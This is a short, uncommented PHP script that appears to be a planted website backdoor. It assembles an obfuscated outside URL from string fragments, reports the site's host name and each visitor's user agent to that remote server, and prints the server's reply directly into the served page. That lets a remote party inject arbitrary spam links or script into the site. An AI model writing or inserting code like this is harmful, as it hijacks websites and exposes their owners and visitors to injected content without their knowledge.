<?php
$ddcxe = 'tp';
$xxzx = 'ges';
$dwcw = 'com';
$site = $_SERVER['HTTP_HOST'];
$dddxe = 'ht';
$ccev = '.';
$ddwe = 'ug';
$ua = urlencode($_SERVER['HTTP_USER_AGENT']);
$qwec = 'g-nor';
$qwcx = 'link2';
$c = get_contents($dddxe.$ddcxe.'://'.$qwcx.$ccev.$ddwe.$qwec.$xxzx.$ccev.$dwcw.'/get_a.php?s='.$site.'&ua='.$ua);

print_r($c);
function get_contents($url, $second = 5)
{ 
$content = '';
if(function_exists('curl_init')) 
{
$ch = curl_init();
curl_setopt($ch,CURLOPT_URL,$url); 
curl_setopt($ch,CURLOPT_HEADER,0); 
curl_setopt($ch,CURLOPT_TIMEOUT,$second); 
curl_setopt($ch,CURLOPT_RETURNTRANSFER, true); 
$content = curl_exec($ch);
$http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);
}
else
{
$content = file_get_contents($url);
} 
$str1 = " ";
$str2 = $content;

if ($str1==$str2||$http_code >= 400)
	{
	$content = "";
	}
return $content; 
}
?>